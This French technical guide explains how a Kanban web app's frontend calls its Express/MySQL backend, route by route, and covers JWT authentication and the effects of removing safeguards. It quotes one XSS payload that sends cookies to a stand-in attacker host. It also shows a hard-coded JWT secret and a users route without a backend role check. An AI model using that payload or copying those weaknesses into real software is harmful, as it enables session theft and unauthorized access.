# LUMINA PRO — CONNEXION FRONT ↔ BACK
## Fichier 2 : Comment chaque fonctionnalité relie le frontend au backend

---

## SCHÉMA GÉNÉRAL DU FLUX

```
FRONTEND                    HTTP                      BACKEND
─────────────────────────────────────────────────────────────────

1. login.html               POST /api/auth/login      routes/auth.js
   js/auth.js ──────────────────────────────────────▶ bcrypt.compare
                ◀─────────────────────────────────── {token, user}

2. index.html               GET /api/columns          routes/columns.js
   js/kanban.js ─────────────────────────────────────▶ SELECT * FROM columns
                 ◀──────────────────────────────────── [{ id, title, position }]

3. index.html               GET /api/tasks            routes/tasks.js
   js/kanban.js ─────────────────────────────────────▶ SELECT tasks.* + LEFT JOIN users
                 ◀──────────────────────────────────── [{ id, title, assigned_name... }]

4. Créer tâche              POST /api/tasks           routes/tasks.js
   js/tasks.js ─────────────────────────────────────▶ INSERT INTO tasks
               ◀─────────────────────────────────── { message: "Tâche créée!" }

5. Modifier tâche           PUT /api/tasks/:id        routes/tasks.js
   js/tasks.js ─────────────────────────────────────▶ UPDATE tasks SET ... WHERE id=?
               ◀─────────────────────────────────── { message: "Tâche mise à jour!" }

6. Déplacer tâche           PUT /api/tasks/:id        routes/tasks.js
   js/tasks.js ─────────────────────────────────────▶ UPDATE tasks SET id_col=? WHERE id=?
               ◀─────────────────────────────────── { message: "Tâche mise à jour!" }

7. Supprimer tâche          DELETE /api/tasks/:id     routes/tasks.js
   js/tasks.js ─────────────────────────────────────▶ DELETE FROM tasks WHERE id=?
               ◀─────────────────────────────────── { message: "Tâche supprimée." }

8. Ajouter colonne          POST /api/columns         routes/columns.js
   js/columns.js ───────────────────────────────────▶ INSERT INTO columns
                  ◀─────────────────────────────────── { id, title, position }

9. Renommer colonne         PUT /api/columns/:id      routes/columns.js
   js/columns.js ───────────────────────────────────▶ UPDATE columns SET title=? WHERE id=?
                  ◀─────────────────────────────────── { message: "Colonne renommée." }

10. Supprimer colonne       DELETE /api/columns/:id   routes/columns.js
    js/columns.js ──────────────────────────────────▶ DELETE FROM columns WHERE id=?
                   ◀────────────────────────────────── { message: "Colonne supprimée." }
                                                       + CASCADE supprime les tâches

11. Voir l'équipe           GET /api/users            routes/users.js
    js/team.js ─────────────────────────────────────▶ SELECT id,name,email,role FROM users
               ◀─────────────────────────────────── [{ id, name, email, role }]

12. Supprimer membre        DELETE /api/users/:id     routes/users.js
    js/team.js ─────────────────────────────────────▶ DELETE FROM users WHERE id=?
               ◀─────────────────────────────────── { message: "Utilisateur supprimé." }
```

---

## DÉTAIL FONCTIONNALITÉ PAR FONCTIONNALITÉ

---

### 1. INSCRIPTION (Register)

**Déclencheur :** Clic sur "Créer mon compte" dans `login.html`

**Frontend (js/auth.js) :**
```js
// Étape 1 : Empêcher rechargement de page
registerForm.onsubmit = async (e) => {
    e.preventDefault();
    
    // Étape 2 : Lire les valeurs du formulaire
    const name = document.getElementById('reg-name').value;
    const email = document.getElementById('reg-email').value;
    const password = document.getElementById('reg-password').value;
    
    // Étape 3 : Envoyer au serveur
    const response = await fetch('http://localhost:3000/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, email, password })
    });
    
    // Étape 4 : Traiter la réponse
    const data = await response.json();
    if (response.ok) alert("Compte créé !");
};
```

**Requête HTTP envoyée :**
```
POST http://localhost:3000/api/auth/register
Headers: Content-Type: application/json
Body: { "name": "Alice", "email": "alice@test.com", "password": "MonPass1!" }
```

**Backend (routes/auth.js) :**
```js
router.post('/register', async (req, res) => {
    const { name, email, password } = req.body;          // Étape 1 : extraire données
    const hashedPassword = await bcrypt.hash(password, 10); // Étape 2 : hacher le mot de passe
    const sql = "INSERT INTO users (name, email, password) VALUES (?, ?, ?)"; // Étape 3 : SQL préparé
    req.db.query(sql, [name, email, hashedPassword], (err, result) => {
        if (err) return res.status(500).json({ error: "..." }); // Étape 4 : gérer erreur
        res.status(201).json({ message: "Utilisateur créé !" }); // Étape 5 : répondre
    });
});
```

**Base de données :**
```sql
INSERT INTO users (name, email, password) VALUES ('Alice', 'alice@test.com', '$2b$10$...(hash)...');
```

**Réponse au frontend :**
```json
{ "message": "Utilisateur créé avec succès !" }
```

---

### 2. CONNEXION (Login)

**Déclencheur :** Clic sur "Se connecter"

**Cycle complet :**
```
login.html                                     server.js + auth.js          MySQL
    │                                               │                          │
    ├─ loginForm.onsubmit()                         │                          │
    ├─ fetch POST /api/auth/login ─────────────────▶│                          │
    │    { email, password }                        │                          │
    │                                               ├─ SELECT * FROM users ───▶│
    │                                               │◀─ [{ id, name, email,    │
    │                                               │     password: "$2b$..."  │
    │                                               │     role: "admin" }]     │
    │                                               │                          │
    │                                               ├─ bcrypt.compare(password, hash)
    │                                               │  → true / false
    │                                               │                          │
    │                                               ├─ jwt.sign({ id, role }, SECRET)
    │                                               │  → "eyJhbGci..."
    │                                               │                          │
    │◀────────────────────────────────── 200 OK ────┤                          │
    │  { token: "eyJ...", user: { id, name, role } }│                          │
    │                                               │                          │
    ├─ localStorage.setItem('token', data.token)    │                          │
    ├─ localStorage.setItem('user', JSON.stringify(data.user))
    └─ window.location.href = 'index.html'
```

---

### 3. CHARGEMENT DU TABLEAU KANBAN

**Déclencheur :** Ouverture de `index.html` → `DOMContentLoaded` → `fetchTasks()`

**Deux requêtes enchaînées :**
```js
// Dans js/kanban.js
async function fetchTasks() {
    // Requête 1 : colonnes
    const resCol = await authFetch('http://localhost:3000/api/columns');
    // ↑ Ajoute automatiquement Authorization: Bearer eyJ... (via authFetch)
    const columns = await resCol.json();
    // columns = [{ id:1, title:"À faire" }, { id:2, title:"En cours" }, ...]
    
    // Requête 2 : tâches
    const resTasks = await authFetch('http://localhost:3000/api/tasks');
    const tasks = await resTasks.json();
    // tasks = [{ id:1, title:"Faire rapport", id_col:1, assigned_name:"Alice" }, ...]
    
    // Affichage
    renderBoard(columns, tasks);
}
```

**Header envoyé par authFetch() :**
```
GET http://localhost:3000/api/tasks
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Ce que fait verifyToken avant de laisser passer :**
```
1. Extrait "eyJ..." du header Authorization
2. jwt.verify("eyJ...", "LUMINA_SECRET_2024")
3. Si OK → req.user = { id: 1, role: 'admin' } → next()
4. Si KO → 403 Forbidden
```

**SQL exécuté (tasks.js) :**
```sql
SELECT tasks.*, users.name as assigned_name 
FROM tasks 
LEFT JOIN users ON tasks.id_assigned = users.id 
ORDER BY id_col ASC, created_at DESC
```

**Résultat JSON retourné :**
```json
[
  { "id": 1, "title": "Finir le rapport", "id_col": 1, "priority": "high", "assigned_name": "Alice" },
  { "id": 2, "title": "Réunion client", "id_col": 2, "priority": "medium", "assigned_name": null }
]
```

---

### 4. CRÉATION D'UNE TÂCHE

**Déclencheur :** Clic sur bouton "+" → formulaire → "Enregistrer"

**Frontend (js/tasks.js) :**
```js
async function handleTaskSubmit(e) {
    e.preventDefault();
    const id = document.getElementById('task-id').value; // Vide = nouvelle tâche
    
    const taskData = {
        title: document.getElementById('task-title').value,
        description: document.getElementById('task-desc').value,
        priority: document.getElementById('task-priority').value,
        id_assigned: document.getElementById('task-assign').value || null
    };
    
    // Pas d'ID → POST (créer)
    const response = await authFetch('http://localhost:3000/api/tasks', {
        method: 'POST',
        body: JSON.stringify(taskData)
    });
    
    if (response.ok) {
        document.getElementById('task-modal').style.display = 'none';
        fetchTasks(); // Recharge le kanban
    }
}
```

**Header de la requête :**
```
POST http://localhost:3000/api/tasks
Authorization: Bearer eyJ...
Content-Type: application/json
Body: { "title": "Ma tâche", "description": "Details", "priority": "high", "id_assigned": 2 }
```

**Backend — logique métier :**
```js
// 1. Si pas de colonne fournie → prend la 1ère colonne
const findColSql = "SELECT id FROM columns ORDER BY position ASC LIMIT 1";
// 2. Insère la tâche
const sql = "INSERT INTO tasks (title, description, priority, id_col, id_assigned) VALUES (?, ?, ?, ?, ?)";
// 3. Log d'activité
const logSql = "INSERT INTO logs (action, details) VALUES ('Création', ?)";
```

---

### 5. DÉPLACEMENT D'UNE TÂCHE (boutons ←→)

**Déclencheur :** Clic sur "⬅️" ou "➡️" dans une carte

**Frontend (js/tasks.js) :**
```js
async function moveTask(taskId, newColId) {
    await authFetch(`http://localhost:3000/api/tasks/${taskId}`, {
        method: 'PUT',
        body: JSON.stringify({ id_col: newColId })  // ← Un seul champ modifié
    });
    fetchTasks(); // Recharge le kanban pour voir le changement
}
```

**Requête HTTP :**
```
PUT http://localhost:3000/api/tasks/3
Authorization: Bearer eyJ...
Content-Type: application/json
Body: { "id_col": 2 }
```

**Backend — construction dynamique :**
```js
// req.body = { id_col: 2 }
// Seul id_col est renseigné → SQL dynamique :
// UPDATE tasks SET id_col = ? WHERE id = ?
// params = [2, 3]
```

---

### 6. SUPPRESSION D'UNE COLONNE (avec CASCADE)

**Déclencheur :** Clic sur "×" dans l'en-tête d'une colonne

**Frontend (js/columns.js) :**
```js
async function deleteColumn(id) {
    if (confirm("Voulez-vous supprimer cette colonne et ses tâches ?")) {
        await authFetch(`http://localhost:3000/api/columns/${id}`, { method: 'DELETE' });
        fetchTasks(); // Recharge → la colonne et ses tâches disparaissent
    }
}
```

**Requête HTTP :**
```
DELETE http://localhost:3000/api/columns/2
Authorization: Bearer eyJ...
```

**Backend + BDD (cascade) :**
```
routes/columns.js → DELETE FROM columns WHERE id = 2
        ↓
MySQL : contrainte ON DELETE CASCADE sur tasks.id_col
        ↓
Suppression automatique de TOUTES les tâches où id_col = 2
```

---

### 7. AFFICHAGE DU PROFIL

**Déclencheur :** Clic sur l'avatar en haut à droite

**Frontend (js/profile.js) — PAS de requête réseau :**
```js
function showProfile() {
    // Données depuis localStorage (stockées au login)
    const user = JSON.parse(localStorage.getItem('user'));
    
    // Injection dans la modale HTML
    document.getElementById('profile-info-content').innerHTML = `
        <h2>${escapeHTML(user.name)}</h2>
        <tr><th>Email</th><td>${escapeHTML(user.email)}</td></tr>
    `;
    
    document.getElementById('profile-info-modal').style.display = 'flex';
}
```

**Important :** Cette fonctionnalité n'appelle PAS le backend. Elle lit le localStorage.
- **Avantage :** Instantané, pas de requête réseau
- **Inconvénient :** Si un admin change ton nom en BDD, tu verras encore l'ancien nom jusqu'à ta prochaine connexion

---

### 8. AFFICHAGE DE L'ÉQUIPE (admin seulement)

**Déclencheur :** Clic sur "Équipe" dans le menu (visible seulement pour les admins)

**Frontend (js/team.js) :**
```js
async function showTeam() {
    const response = await authFetch('http://localhost:3000/api/users');
    const users = await response.json();
    
    // Construction du tableau HTML avec les données
    area.innerHTML = `<table>...${users.map(u => `<tr>...</tr>`).join('')}...</table>`;
}
```

**Requête HTTP :**
```
GET http://localhost:3000/api/users
Authorization: Bearer eyJ...
```

**Backend (routes/users.js) :**
```js
const sql = "SELECT id, name, email, role FROM users";
// Note : pas de vérification de rôle côté backend dans le code actuel
// En production, on ajouterait : if (req.user.role !== 'admin') return res.status(403)
```

---

## TABLEAU RÉCAPITULATIF DE TOUS LES APPELS API

| Fonctionnalité | Méthode | Endpoint | Auth JWT | Fichier Front | Fichier Back |
|----------------|---------|----------|----------|---------------|--------------|
| Inscription | POST | /api/auth/register | ❌ Non | js/auth.js | routes/auth.js |
| Connexion | POST | /api/auth/login | ❌ Non | js/auth.js | routes/auth.js |
| Charger tâches | GET | /api/tasks | ✅ Oui | js/kanban.js | routes/tasks.js |
| Créer tâche | POST | /api/tasks | ✅ Oui | js/tasks.js | routes/tasks.js |
| Modifier tâche | PUT | /api/tasks/:id | ✅ Oui | js/tasks.js | routes/tasks.js |
| Déplacer tâche | PUT | /api/tasks/:id | ✅ Oui | js/tasks.js | routes/tasks.js |
| Supprimer tâche | DELETE | /api/tasks/:id | ✅ Oui | js/tasks.js | routes/tasks.js |
| Charger colonnes | GET | /api/columns | ✅ Oui | js/kanban.js | routes/columns.js |
| Créer colonne | POST | /api/columns | ✅ Oui | js/columns.js | routes/columns.js |
| Renommer colonne | PUT | /api/columns/:id | ✅ Oui | js/columns.js | routes/columns.js |
| Supprimer colonne | DELETE | /api/columns/:id | ✅ Oui | js/columns.js | routes/columns.js |
| Liste utilisateurs | GET | /api/users | ✅ Oui | js/team.js, js/ui.js | routes/users.js |
| Supprimer membre | DELETE | /api/users/:id | ✅ Oui | js/team.js | routes/users.js |
| Voir profil | — | (localStorage) | — | js/profile.js | — |

---

## QUE SE PASSE-T-IL SI ON SUPPRIME UNE FONCTIONNALITÉ ?

### Si on supprime `authFetch()` (js/api.js)
**Conséquence :** Toutes les requêtes partent SANS token JWT → le serveur répond 401/403 à tout → rien ne fonctionne sauf login/register.
**Remplacement :** Ajouter manuellement `Authorization: Bearer ${localStorage.getItem('token')}` dans chaque `fetch()`.

### Si on supprime `verifyToken` (middleware/security.js)
**Conséquence :** N'importe qui peut accéder à toutes les routes sans être connecté. L'API est complètement ouverte.
**Remplacement :** Session Express + cookies (approche traditionnelle), ou un autre système de token.

### Si on supprime `escapeHTML()` (js/api.js)
**Conséquence :** Faille XSS ouverte. Un utilisateur peut créer une tâche avec `<script>document.location='http://pirate.com?c='+document.cookie</script>` → vole les tokens de tous les visiteurs.
**Remplacement :** Utiliser une bibliothèque comme DOMPurify, ou passer par `textContent` au lieu de `innerHTML`.

### Si on supprime `bcrypt.hash()` (routes/auth.js)
**Conséquence :** Les mots de passe sont stockés en clair en BDD. Si la BDD est compromise → tous les mots de passe sont visibles.
**Remplacement :** Autre algorithme de hachage (Argon2, scrypt) — mais jamais MD5/SHA1 seuls (trop faibles).

### Si on supprime `ON DELETE CASCADE` (schema.sql)
**Conséquence :** Si on supprime une colonne, les tâches de cette colonne restent en BDD avec un `id_col` qui pointe vers une colonne inexistante → erreur de clé étrangère ou données orphelines.
**Remplacement :** Gérer manuellement la suppression des tâches avant de supprimer la colonne dans la route DELETE.

### Si on supprime `LEFT JOIN` et on met `INNER JOIN` (routes/tasks.js)
**Conséquence :** Les tâches sans utilisateur assigné n'apparaissent plus dans le kanban → elles existent en BDD mais sont invisibles.
**Remplacement :** Garder LEFT JOIN ou gérer un utilisateur "Non assigné" par défaut.

### Si on supprime `e.preventDefault()` (js/auth.js)
**Conséquence :** Le formulaire se soumet de manière classique (rechargement de page). La requête `fetch` est lancée mais la page recharge immédiatement → on ne voit jamais la réponse.
**Remplacement :** Rien, c'est obligatoire dès qu'on gère un formulaire avec `fetch`.

### Si on supprime `localStorage.clear()` dans le logout (js/ui.js)
**Conséquence :** Le token reste dans le localStorage après déconnexion. L'utilisateur peut revenir sur `index.html` et est toujours "connecté" jusqu'à expiration du token (24h).
**Remplacement :** Invalider le token côté serveur (blacklist), ou utiliser des cookies httpOnly avec session.

### Si on supprime le chargement des users dans `loadUsers()` (js/ui.js)
**Conséquence :** La liste déroulante "Assigné à" dans la modale de création de tâche sera vide → impossible d'assigner une tâche à quelqu'un.
**Remplacement :** Charger les users depuis une autre source (cache, BDD directe) ou désactiver l'assignation.

### Si on supprime le tri `ORDER BY position ASC` (routes/columns.js)
**Conséquence :** Les colonnes apparaissent dans un ordre aléatoire ou selon l'ordre d'insertion en BDD → "Terminé" peut s'afficher avant "À faire".
**Remplacement :** Trier côté frontend avec `.sort()` sur le tableau de colonnes.

---

## COMMENT FONCTIONNE UN JWT — EXPLICATION COMPLÈTE

```
STRUCTURE D'UN TOKEN JWT :
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIn0.SIGNATURE

Partie 1 : HEADER (Base64URL)
  → Décodé : { "alg": "HS256", "typ": "JWT" }
  → L'algorithme de signature utilisé

Partie 2 : PAYLOAD (Base64URL)
  → Décodé : { "id": 1, "role": "admin", "iat": 1703..., "exp": 1703...+86400 }
  → Les données de l'utilisateur (PAS le mot de passe !)
  → iat = issued at (quand créé), exp = expiration

Partie 3 : SIGNATURE (HMAC-SHA256)
  → HMAC(Base64(header) + "." + Base64(payload), SECRET_KEY)
  → Garantit que personne n'a modifié le payload
```

**Ce que le pirate peut faire :**
- ✅ Lire le payload (il est encodé en Base64, pas chiffré)
- ❌ Modifier le payload sans invalider la signature (il ne connaît pas SECRET_KEY)
- ❌ Forger un token valide

**C'est pourquoi on ne met PAS d'infos sensibles dans le payload !**
